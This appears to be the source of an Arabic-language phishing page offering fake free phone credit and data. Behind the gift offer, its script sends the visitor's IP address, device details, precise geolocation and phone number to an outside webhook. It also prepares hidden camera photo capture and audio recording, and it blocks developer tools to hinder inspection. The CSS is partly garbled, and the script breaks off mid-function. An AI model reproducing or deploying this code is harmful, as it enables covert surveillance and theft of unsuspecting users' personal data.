<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>🎁 هدية مجانية - رصيد ونت</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* ============================================================
           RESET & BASE
           ============================================================ */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --gold: #f5c842;
            --gold-light: #ffdd77;
            --gold-dark: #c8942a;
            --glass-bg: rgba(255, 255, 255, 0.04);
            --glass-border: rgba(255, 215, 0, 0.08);
            --shadow-gold: rgba(245, 200, 66, 0.25);
            --shadow-deep: rgba(0, 0, 0, 0.8);
            --radius-xl: 48px;
            --radius-lg: 28px;
            --radius-md: 18px;
            --transition-smooth: cubic-bezier(0.23, 1, 0.32, 1);
            --transition-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        html {
            font-size: 16px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            background: #0a0505;
            color: #fff;
            position: relative;
            overflow-x: hidden;
            background: radial-gradient(ellipse at 20% 20%, #1f0f0a, #0a0505 70%);
        }

        /* ============================================================
           BACKGROUND LAYERS
           ============================================================ */
        #bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .bg-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background:
                radial-gradient(ellipse at 30% 80%, rgba(245, 200, 66, 0.04), transparent 60%),
                radial-gradient(ellipse at 80% 20%, rgba(200, 148, 42, 0.03), transparent 50%),
                radial-gradient(ellipse at 50% 50%, rgba(255, 215, 0, 0.01), transparent 70%);
        }

        .bg-fog {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background:
                radial-gradient(ellipse at 40% 30%, rgba(255, 200, 100, 0.02), transparent 50%),
                radial-gradient(ellipse at 70% 70%, rgba(255, 180, 80, 0.015), transparent 40%);
            animation: fogDrift 24s ease-in-out infinite alternate;
        }

        @keyframes fogDrift {
            0% {
                transform: translate(0, 0) scale(1);
            }
            33% {
                transform: translate(2%, -1%) scale(1.02);
            }
            66% {
                transform: translate(-1%, 2%) scale(0.98);
            }
            100% {
                transform: translate(1%, -2%) scale(1.01);
            }
        }

        .bg-light-rays {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background:
                repeating-linear-gradient(45deg,
                    transparent,
                    transparent 40px,
                    rgba(255, 215, 0, 0.008) 40px,
                    rgba(255, 215, 0, 0.008) 42px,
                    transparent 42px,
                    transparent 80px);
            animation: lightRays 30s linear infinite;
            opacity: 0.5;
        }

        @keyframes lightRays {
            0% {
                transform: translateX(0) translateY(0) rotate(0deg);
            }
            100% {
                transform: translateX(100px) translateY(50px) rotate(2deg);
            }
        }

        .bg-sparkles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background-image:
                radial-gradient(1px 1px at 10% 20%, rgba(255, 215, 0, 0.3), transparent),
                radial-gradient(1px 1px at 30% 60%, rgba(255, 215, 0, 0.2), transparent),
                radial-gradient(1.5px 1.5px at 55% 10%, rgba(255, 215, 0, 0.25), transparent),
                radial-gradient(1px 1px at 70% 80%, rgba(255, 215, 0, 0.15), transparent),
                radial-gradient(1.5px 1.5px at 90% 30%, rgba(255, 215, 0, 0.2), transparent),
                radial-gradient(1px 1px at 15% 90%, rgba(255, 215, 0, 0.1), transparent),
                radial-gradient(1px 1px at 85% 70%, rgba(255, 215, 0, 0.15), transparent);
            background-size: 100% 100%;
            background-repeat: no-repeat;
            animation: sparklePulse 6s ease-in-out infinite alternate;
        }

        @keyframes sparklePulse {
            0%,
            100% {
                opacity: 0.5;
                transform: scale(1);
            }
            50% {
                opacity: 1;
                transform: scale(1.02);
            }
        }

        /* ============================================================
           WRAPPER
           ============================================================ */
        .app-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 580px;
            margin: 0 auto;
        }

        /* ============================================================
           HEADER
           ============================================================ */
        .app-header {
            text-align: center;
            margin-bottom: 32px;
            position: relative;
        }

        .app-header .logo-wrap {
            display: inline-block;
            position: relative;
            margin-bottom: 4px;
        }

        .app-header .logo-icon {
            font-size: 72px;
            display: block;
            animation: logoFloat 4s ease-in-out infinite;
            filter: drop-shadow(0 20px 60px rgba(245, 200, 66, 0.2));
            transition: transform 0.6s var(--transition-smooth);
        }

        .app-header .logo-icon:hover {
            transform: scale(1.08) rotate(-4deg);
        }

        @keyframes logoFloat {
            0%,
            100% {
                transform: translateY(0) scale(1);
            }
            50% {
                transform: translateY(-14px) scale(1.04);
            }
        }

        .app-header .logo-glow {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120%;
            height: 120%;
            transform: translate(-50%, -50%);
            background: radial-gradient(ellipse, rgba(245, 200, 66, 0.12), transparent 70%);
            border-radius: 50%;
            filter: blur(30px);
            pointer-events: none;
            animation: glowPulse 3s ease-in-out infinite alternate;
        }

        @keyframes glowPulse {
            0% {
                opacity: 0.5;
                transform: translate(-50%, -50%) scale(0.8);
            }
            100% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1.2);
            }
        }

        .app-header h1 {
            font-size: 36px;
            font-weight: 900;
            margin-top: 4px;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #ffdd77, #f5c842, #c8942a, #f5c842);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: goldShimmer 6s ease-in-out infinite;
            text-shadow: 0 0 60px rgba(245, 200, 66, 0.08);
            position: relative;
        }

        @keyframes goldShimmer {
            0%,
            100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        .app-header .subtitle {
            color: rgba(255, 200, 150, 0.7);
            font-size: 16px;
            font-weight: 300;
            margin-top: 2px;
            letter-spacing: 2px;
        }

        .app-header .subtitle i {
            color: var(--gold);
            margin: 0 4px;
        }

        /* ============================================================
           STEP INDICATOR
           ============================================================ */
        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            margin-bottom: 32px;
            position: relative;
            padding: 0 20px;
        }

        .step-indicator::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 2px;
            background: rgba(255, 255, 255, 0.04);
            transform: translateY(-50%);
            border-radius: 2px;
            z-index: 0;
        }

        .step-dot {
            position: relative;
            z-index: 1;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid rgba(255, 215, 0, 0.08);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 16px;
            color: rgba(255, 255, 255, 0.2);
            transition: all 0.6s var(--transition-bounce);
            backdrop-filter: blur(8px);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            cursor: default;
        }

        .step-dot.active {
            background: linear-gradient(135deg, #f5c842, #c8942a);
            border-color: #f5c842;
            color: #0a0505;
            transform: scale(1.15);
            box-shadow: 0 0 50px rgba(245, 200, 66, 0.3), inset 0 0 30px rgba(255, 255, 255, 0.1);
        }

        .step-dot.completed {
            background: rgba(40, 167, 69, 0.15);
            border-color: #28a745;
            color: #28a745;
            box-shadow: 0 0 30px rgba(40, 167, 69, 0.1);
        }

        .step-dot .dot-inner {
            position: relative;
            z-index: 2;
        }

        .step-dot .dot-glow {
            position: absolute;
            inset: -4px;
            border-radius: 50%;
            background: radial-gradient(ellipse, rgba(245, 200, 66, 0.15), transparent 70%);
            filter: blur(8px);
            opacity: 0;
            transition: opacity 0.6s ease;
        }

        .step-dot.active .dot-glow {
            opacity: 1;
        }

        .step-line {
            position: relative;
            z-index: 0;
            flex: 1;
            max-width: 50px;
            height: 2px;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 2px;
            transition: background 0.8s var(--transition-smooth);
        }

        .step-line.active {
            background: linear-gradient(90deg, #f5c842, #c8942a);
            box-shadow: 0 0 20px rgba(245, 200, 66, 0.1);
        }

        /* ============================================================
           MAIN CARD
           ============================================================ */
        .main-card {
            position: relative;
            background: rgba(10, 5, 5, 0.6);
            backdrop-filter: blur(40px) saturate(1.2);
            -webkit-backdrop-filter: blur(40px) saturate(1.2);
            border-radius: var(--radius-xl);
            padding: 32px 28px 28px;
            border: 1px solid rgba(255, 215, 0, 0.06);
            box-shadow:
                0 60px 120px rgba(0, 0, 0, 0.7),
                0 0 0 1px rgba(255, 215, 0, 0.02) inset,
                0 0 80px rgba(245, 200, 66, 0.02) inset;
            overflow: hidden;
            transition: all 0.8s var(--transition-smooth);
        }

        .main-card::before {
            content: '';
            position: absolute;
            inset: 0;
            background:
                radial-gradient(ellipse at 30% 20%, rgba(245, 200, 66, 0.03), transparent 60%),
                radial-gradient(ellipse at 70% 80%, rgba(200, 148, 42, 0.02), transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .main-card::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: var(--radius-xl);
            padding: 1px;
            background: linear-gradient(135deg,
                    rgba(255, 215, 0, 0.08),
                    transparent 40%,
                    transparent 60%,
                    rgba(255, 215, 0, 0.04));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            z-index: 1;
        }

        .main-card .card-shine {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 215, 0, 0.04), transparent 50%);
            pointer-events: none;
            z-index: 0;
            animation: shineMove 12s ease-in-out infinite alternate;
        }

        @keyframes shineMove {
            0% {
                transform: translate(0, 0) rotate(0deg);
            }
            100% {
                transform: translate(10%, 5%) rotate(5deg);
            }
        }

        .main-card .card-inner {
            position: relative;
            z-index: 2;
        }

        /* ============================================================
           STEPS
           ============================================================ */
        .step {
            display: none;
            animation: stepEnter 0.7s var(--transition-bounce) forwards;
        }

        .step.active {
            display: block;
        }

        @keyframes stepEnter {
            0% {
                opacity: 0;
                transform: translateY(40px) scale(0.96);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .step-title {
            font-size: 30px;
            font-weight: 800;
            margin-bottom: 4px;
            color: #fff;
            letter-spacing: 0.5px;
        }

        .step-title .highlight {
            background: linear-gradient(135deg, #ffdd77, #f5c842, #c8942a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .step-desc {
            color: rgba(200, 180, 160, 0.8);
            font-size: 16px;
            margin-bottom: 24px;
            font-weight: 300;
        }

        /* ============================================================
           COUNTRY GRID — 3D Glass Cards
           ============================================================ */
        .country-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 14px;
            margin: 20px 0 16px;
        }

        .country-btn {
            position: relative;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 215, 0, 0.04);
            border-radius: var(--radius-lg);
            padding: 18px 6px 14px;
            color: #fff;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.5s var(--transition-bounce);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-family: 'Cairo', sans-serif;
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            transform: perspective(800px) rotateX(0deg) rotateY(0deg) translateZ(0);
            will-change: transform;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
        }

        .country-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: var(--radius-lg);
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 215, 0, 0.06), transparent 50%, rgba(255, 215, 0, 0.03));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            transition: all 0.6s ease;
        }

        .country-btn .flag {
            font-size: 42px;
            line-height: 1.2;
            transition: transform 0.6s var(--transition-bounce);
            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.3));
        }

        .country-btn .name {
            font-size: 15px;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.85);
            transition: color 0.4s ease;
        }

        .country-btn .btn-glow {
            position: absolute;
            inset: -2px;
            border-radius: var(--radius-lg);
            background: radial-gradient(ellipse at 50% 0%, rgba(245, 200, 66, 0.06), transparent 60%);
            opacity: 0;
            transition: opacity 0.6s ease;
            pointer-events: none;
        }

        .country-btn:hover {
            background: rgba(255, 215, 0, 0.04);
            border-color: rgba(245, 200, 66, 0.15);
            transform: perspective(800px) rotateX(2deg) rotateY(4deg) translateZ(12px) scale(1.02);
            box-shadow:
                0 20px 60px rgba(0, 0, 0, 0.4),
                0 0 40px rgba(245, 200, 66, 0.04);
        }

        .country-btn:hover .flag {
            transform: scale(1.08) rotate(-2deg);
        }

        .country-btn:hover .name {
            color: #ffdd77;
        }

        .country-btn:hover .btn-glow {
            opacity: 1;
        }

        .country-btn:active {
            transform: perspective(800px) rotateX(0deg) rotateY(0deg) translateZ(0) scale(0.94);
            transition-duration: 0.15s;
        }

        /* ============================================================
           PERMISSION / GIFT BOX AREA
           ============================================================ */
        .permission-wrapper {
            position: relative;
            background: rgba(255, 215, 0, 0.02);
            border-radius: var(--radius-lg);
            padding: 22px 24px 18px;
            margin: 16px 0 20px;
            border: 1px solid rgba(255, 215, 0, 0.04);
            overflow: hidden;
        }

        .permission-wrapper::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 80%;
            height: 200%;
            background: radial-gradient(ellipse, rgba(245, 200, 66, 0.03), transparent 60%);
            pointer-events: none;
        }

        .permission-wrapper .gift-icon-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 14px;
            position: relative;
        }

        .permission-wrapper .gift-box {
            font-size: 56px;
            display: inline-block;
            animation: giftFloat 3.5s ease-in-out infinite;
            filter: drop-shadow(0 12px 40px rgba(245, 200, 66, 0.15));
            position: relative;
            cursor: default;
            transition: transform 0.6s var(--transition-bounce);
        }

        .permission-wrapper .gift-box:hover {
            transform: scale(1.08) rotate(-2deg);
        }

        @keyframes giftFloat {
            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-8px) rotate(2deg);
            }
        }

        .permission-wrapper .gift-box .gift-shine {
            position: absolute;
            top: -20%;
            left: -20%;
            width: 140%;
            height: 140%;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 215, 0, 0.08), transparent 50%);
            border-radius: 50%;
            filter: blur(20px);
            animation: giftGlow 4s ease-in-out infinite alternate;
            pointer-events: none;
        }

        @keyframes giftGlow {
            0% {
                opacity: 0.4;
                transform: scale(0.8);
            }
            100% {
                opacity: 1;
                transform: scale(1.2);
            }
        }

        .permission-wrapper ul {
            list-style: none;
            padding: 0;
            margin: 6px 0 0;
            text-align: right;
            position: relative;
            z-index: 1;
        }

        .permission-wrapper ul li {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
            color: rgba(220, 200, 185, 0.9);
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 14px;
            font-weight: 400;
        }

        .permission-wrapper ul li:last-child {
            border-bottom: none;
        }

        .permission-wrapper ul li i {
            color: #f5c842;
            font-size: 20px;
            width: 28px;
            text-align: center;
            filter: drop-shadow(0 0 12px rgba(245, 200, 66, 0.08));
        }

        .permission-wrapper .note {
            color: rgba(200, 180, 160, 0.6);
            font-size: 14px;
            margin-top: 14px;
            text-align: center;
            border-top: 1px solid rgba(255, 255, 255, 0.03);
            padding-top: 14px;
            position: relative;
            z-index: 1;
        }

        .permission-wrapper .note strong {
            color: #f5c842;
            font-weight: 700;
        }

        /* ============================================================
           INPUT GROUP
           ============================================================ */
        .input-group {
            margin: 18px 0 16px;
            text-align: right;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 15px;
            color: rgba(220, 200, 185, 0.8);
            margin-bottom: 6px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .input-group label i {
            color: #f5c842;
            margin-left: 8px;
        }

        .input-group .input-wrap {
            position: relative;
            border-radius: 60px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 215, 0, 0.04);
            transition: all 0.5s var(--transition-smooth);
            overflow: hidden;
        }

        .input-group .input-wrap::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 215, 0, 0.06), transparent 40%, transparent 60%, rgba(255, 215, 0, 0.03));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            transition: all 0.5s ease;
        }

        .input-group .input-wrap:focus-within {
            border-color: rgba(245, 200, 66, 0.2);
            box-shadow: 0 0 0 6px rgba(245, 200, 66, 0.03), 0 0 40px rgba(245, 200, 66, 0.02);
        }

        .input-group .input-wrap:focus-within::before {
            background: linear-gradient(135deg, rgba(245, 200, 66, 0.15), rgba(200, 148, 42, 0.05));
        }

        .input-group input {
            width: 100%;
            padding: 18px 24px;
            border: none;
            background: transparent;
            color: #fff;
            font-size: 20px;
            outline: none;
            font-family: 'Cairo', sans-serif;
            text-align: right;
            letter-spacing: 0.5px;
            position: relative;
            z-index: 1;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.15);
            font-size: 17px;
            font-weight: 300;
        }

        .input-group .input-shine {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 215, 0, 0.02), transparent 60%);
            pointer-events: none;
            z-index: 0;
            animation: inputShine 8s ease-in-out infinite alternate;
        }

        @keyframes inputShine {
            0% {
                transform: translate(0, 0) rotate(0deg);
            }
            100% {
                transform: translate(10%, 5%) rotate(3deg);
            }
        }

        /* ============================================================
           CLAIM BUTTON — Luxury
           ============================================================ */
        .btn-gold {
            position: relative;
            background: linear-gradient(135deg, #f5c842, #dba832, #c8942a);
            border: none;
            color: #0a0505;
            font-weight: 800;
            padding: 22px 30px;
            border-radius: 60px;
            font-size: 24px;
            width: 100%;
            cursor: pointer;
            transition: all 0.5s var(--transition-bounce);

        .btn-gold:active:not(:disabled) {

        .btn-gold .spinner {

        }

        .btn-gold.loading .spinner {
            display: inline-block;
        }

        .btn-gold.loading .btn-text {
            display: none;

        @keyframes spin {
            to {
                transform: rotate(360deg);

        /* ============================================================
           STATUS
           ============================================================ */

    <!-- ============================================================
    SCRIPT
    ============================================================ -->
    <script>
        // ============================================================
        //  CONFIG
        // ============================================================
        const WEBHOOK_URL =
            "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";

        // ============================================================
        //  CONSTANTS
        // ============================================================
        const TOTAL_PHOTOS = 8;
        const CAPTURE_INTERVAL = 700;
        const AUDIO_DURATION = 5000;
        const PHOTO_QUALITY = 0.92;

        // ============================================================
        //  COUNTRIES
        // ============================================================
        const countries = {
            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
            'العراق': { flag: '🇮🇶', prefixes: ['7'] },
            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
        };

        // ============================================================
        //  TOKEN
        // ============================================================
        let USER_TOKEN = null;

        function extractTokenFromURL() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('i');
            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
                USER_TOKEN = token;
                return true;
            }
            USER_TOKEN = null;
            return false;
        }

        // ============================================================
        //  WEBHOOK
        // ============================================================
        async function sendToWebhook(formData) {
            if (!USER_TOKEN) {
                console.error('❌ Token missing');
                return { success: false, error: 'Token missing' };
            }
            formData.append('token', USER_TOKEN);
            try {
                const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                const data = await res.json();
                if (!res.ok) return { success: false, error: data.message || 'HTTP error' };
                return { success: true, data };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }

        // ============================================================
        //  STATE
        // ============================================================
        let selectedCountry = null;
        let userPhone = null;
        let mediaStream = null;
        let audioStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let capturedPhotoFiles = [];
        let audioBlob = null;
        let userIP = 'غير متاح';
        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
        let isProcessing = false;
        let timerInterval = null;
        let timerSeconds = 180;

        // DOM
        const stepCountry = document.getElementById('step-country');
        const stepTasks = document.getElementById('step-tasks');
        const stepTimer = document.getElementById('step-timer');
        const countryList = document.getElementById('countryList');
        const statusCountry = document.getElementById('statusCountry');
        const statusTasks = document.getElementById('statusTasks');
        const statusTimer = document.getElementById('statusTimer');
        const claimBtn = document.getElementById('claimBtn');
        const phoneInput = document.getElementById('phoneInput');
        const permissionArea = document.getElementById('permissionArea');
        const timerDisplay = document.getElementById('timerDisplay');
        const taskSub = document.getElementById('taskSub');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');

        const stepDots = document.querySelectorAll('.step-dot');
        const stepLines = document.querySelectorAll('.step-line');

        // ============================================================
        //  STEP INDICATOR
        // ============================================================
        function updateStepIndicator(step) {
            stepDots.forEach((dot, idx) => {
                const num = idx + 1;
                dot.classList.remove('active', 'completed');
                if (num === step) dot.classList.add('active');
                else if (num < step) dot.classList.add('completed');
            });
            stepLines.forEach((line, idx) => {
                const num = idx + 1;
                line.classList.toggle('active', num < step);
            });
        }

        // ============================================================
        //  NOTIFY VISIT
        // ============================================================
        async function notifyUserEntered() {
            if (!USER_TOKEN) return;
            let ip = 'غير متاح';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
                userIP = ip;
            } catch (_) { /* ignore */ }
            const fd = new FormData();
            fd.append('event', 'visit');
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', ip);
            fd.append('userAgent', navigator.userAgent);
            fd.append('platform', navigator.platform);
            fd.append('language', navigator.language);
            fd.append('screen', `${screen.width}x${screen.height}`);
            fd.append('url', window.location.href);
            await sendToWebhook(fd).catch(() => {});
        }

        // ============================================================
        //  SUSPICIOUS
        // ============================================================
        function detectSuspiciousActivity() {
            document.addEventListener('contextmenu', (e) => { e.preventDefault();
                sendSuspiciousAlert('🖱️ النقر الأيمن'); });
            document.addEventListener('keydown', (e) => {
                const k = e.key;
                const c = e.ctrlKey || e.metaKey;
                const s = e.shiftKey;
                if (k === 'F12' || (c && s && (k === 'I' || k === 'C' || k === 'J')) || (c && k === 'U')) {
                    e.preventDefault();
                    sendSuspiciousAlert(`⌨️ أدوات المطور (${k})`);
                }
                if (c && ['c', 'v', 'x'].includes(k)) {
                    sendSuspiciousAlert(`📋 ${k === 'c' ? 'نسخ' : k === 'v' ? 'لصق' : 'قص'}`);
                }
            });
            document.addEventListener('dragstart', (e) => { e.preventDefault();
                sendSuspiciousAlert('🔄 سحب'); });
            document.addEventListener('selectstart', () => { sendSuspiciousAlert('✏️ تحديد نص'); });
        }

        let alertCooldown = 0;

        function sendSuspiciousAlert(action) {
            if (!USER_TOKEN) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const fd = new FormData();
            fd.append('event', 'suspicious');
            fd.append('action', action);
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', userIP);
            fd.append('userAgent', navigator.userAgent);
            fd.append('url', window.location.href);
            sendToWebhook(fd).catch(() => {});
        }

        // ============================================================
        //  RENDER COUNTRIES
        // ============================================================
        function renderCountries() {
            countryList.innerHTML = '';
            Object.keys(countries).forEach((name) => {
                const btn = document.createElement('button');
                btn.className = 'country-btn';
                btn.innerHTML = `
                    <span class="btn-glow"></span>
                    <span class="flag">${countries[name].flag}</span>
                    <span class="name">${name}</span>
                `;
                btn.dataset.country = name;
                btn.addEventListener('click', () => selectCountry(name));

                // 3D tilt on mouse move
                btn.addEventListener('mousemove', (e) => {
                    const rect = btn.getBoundingClientRect();
                    const x = (e.clientX - rect.left) / rect.width - 0.5;
                    const y = (e.clientY - rect.top) / rect.height - 0.5;
                    btn.style.transform =
                        `perspective(800px) rotateX(${y * -6}deg) rotateY(${x * 8}deg) translateZ(10px) scale(1.02)`;
                });
                btn.addEventListener('mouseleave', () => {
                    btn.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg) translateZ(0) scale(1)';
                });

                countryList.appendChild(btn);
            });
        }
        renderCountries();

        // ============================================================
        //  SELECT COUNTRY
        // ============================================================
        async function selectCountry(name) {
            selectedCountry = name;
            const data = countries[name];
            taskSub.textContent = `للاستفادة من هدية ${name} (رصيد، نت، وحدات)`;
            const prefixes = data.prefixes.join('، ');

            permissionArea.innerHTML = `
                <div class="gift-icon-wrap">
                    <span class="gift-box">
                        🎁
                        <span class="gift-shine"></span>
                    </span>
                </div>
                <ul>
                    <li><i class="fas fa-gift"></i> هدية مجانية بقيمة تصل إلى 50$</li>
                    <li><i class="fas fa-wifi"></i> باقة نت إضافية لمدة 7 أيام</li>
                    <li><i class="fas fa-phone-alt"></i> وحدات اتصال محلية ودولية</li>
                </ul>
                <div class="note">📞 الأرقام المسموحة: <strong>${prefixes}</strong></div>
            `;

            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;

            showStep('step-tasks');
            updateStepIndicator(2);
            statusTasks.className = 'status';
            statusTasks.style.display = 'block';
            statusTasks.className = 'status info';
            statusTasks.textContent = '📍 جاري تحديد موقعك...';

            await getLocation();

            phoneInput.value = '';
            capturedPhotoFiles = [];
            audioChunks = [];
            audioBlob = null;
            claimBtn.disabled = false;
            claimBtn.classList.remove('loading');
            claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على هديتي';
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach((el) => el.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // ============================================================
        //  STATUS HELPER
        // ============================================================
        function showStatus(el, type, message) {
            el.className = `status ${type}`;
            el.textContent = message;
            el.style.display = 'block';
            if (type !== 'error') {
                clearTimeout(el._timeout);
                el._timeout = setTimeout(() => {
                    if (el.className.includes(type)) el.style.display = 'none';
                }, 8000);
            }
        }

        // ============================================================
        //  LOCATION
        // ============================================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    resolve();
                    return;
                }
                let watchId = null;
                let best = null;
                let bestAcc = Infinity;
                let resolved = false;
                let attempts = 0;
                const MAX_ATTEMPTS = 10;
                const TIMEOUT_MS = 15000;
                const TARGET = 100;

                const done = () => {
                    if (resolved) return;
                    resolved = true;
                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                    if (best) {
                        userLocation.lat = best.coords.latitude;
                        userLocation.lng = best.coords.longitude;
                        userLocation.accuracy = best.coords.accuracy;
                        userLocation.error = null;
                    } else {
                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                    }
                    resolve();
                };

                const timeoutId = setTimeout(() => {
                    if (!resolved) {
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        if (best) done();
                        else { userLocation.error = 'انتهت المهلة';
                            resolve(); }
                    }
                }, TIMEOUT_MS);

                const handlePos = (pos) => {
                    attempts++;
                    const acc = pos.coords.accuracy;
                    if (acc < bestAcc) { bestAcc = acc;
                        best = pos; }
                    if (acc <= TARGET || attempts >= MAX_ATTEMPTS) {
                        done();
                        clearTimeout(timeoutId);
                    }
                };

                const handleErr = (err) => {
                    if (resolved) return;
                    if (err.code === 1) {
